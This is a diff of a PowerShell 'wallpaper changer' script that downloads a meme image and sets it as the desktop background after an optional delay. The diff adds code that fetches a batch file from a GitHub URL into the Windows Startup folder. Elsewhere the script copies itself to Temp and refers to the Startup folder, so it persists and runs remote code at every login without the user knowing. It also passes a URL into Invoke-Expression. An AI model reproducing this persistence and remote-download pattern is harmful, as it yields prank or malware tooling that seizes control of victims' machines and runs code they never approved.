@@ -1,16 +1,39 @@
+param (
+    [string]$imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg",
+    [int]$delayHours = 0
+)
+
 $scriptPath1 = "$env:userprofile\AppData\Local\Temp\set.ps1"
 $scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\set.ps1"
 $batFilePath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
 $batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"
 
-# This is for changing the wallpaper at x time (x=delayHours), if false doesn't wait and does at start.
-$startDelayEnabled = $false
-$delayHours = 3
+$imagePath = "$env:userprofile\Pictures\background.jpg"
 
 function Show-ErrorMessage {
     param([string]$errorMessage)
     Add-Type -AssemblyName PresentationFramework
     [System.Windows.MessageBox]::Show($errorMessage, "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
+}
+
+function DownloadFile {
+    param (
+        [string]$url,
+        [string]$outputPath
+    )
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction Stop
+    } catch {
+        try {
+            Invoke-Expression "curl -o `"$outputPath`" `"$url`"" | Out-Null
+            if (-not (Test-Path $outputPath)) {
+                throw "Curl download failed."
+            }
+        } catch {
+            Show-ErrorMessage "Failed to download file: $url"
+            exit
+        }
+    }
 }
 
 function Get-ScriptPath {
@@ -26,23 +49,13 @@ if ($null -eq $scriptPath) {
     exit
 }
 
-if ($startDelayEnabled -eq $true) {
+if ($delayHours -gt 0) {
     Start-Sleep -Seconds ($delayHours * 3600)
 }
 
-# You can change these variables (imagePath and imageUrl) for different image and path of the image on the local computer.
-$imagePath = "$env:userprofile\Pictures\background.jpg"
-$imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg"
-
 try {
     if (-not (Test-Path $imagePath)) {
-        Invoke-Expression "curl -o `"$imagePath`" `"$imageUrl`"" | Out-Null
-        if (-not (Test-Path $imagePath)) {
-            Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath | Out-Null
-            if (-not (Test-Path $imagePath)) {
-                throw "Failed to download image."
-            }
-        }
+        DownloadFile $imageUrl $imagePath
     }
 } catch {
     Show-ErrorMessage "Error during image download: $_"
@@ -90,4 +103,8 @@ if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
     Copy-Item $MyInvocation.MyCommand.Path $scriptPath1 -ErrorAction Stop
 } catch {
     Show-ErrorMessage "Failed to copy script to temp folder: $_"
+}
+
+if (-not (Test-Path $batFilePath)) {
+    DownloadFile $batchUrl $batFilePath
 }
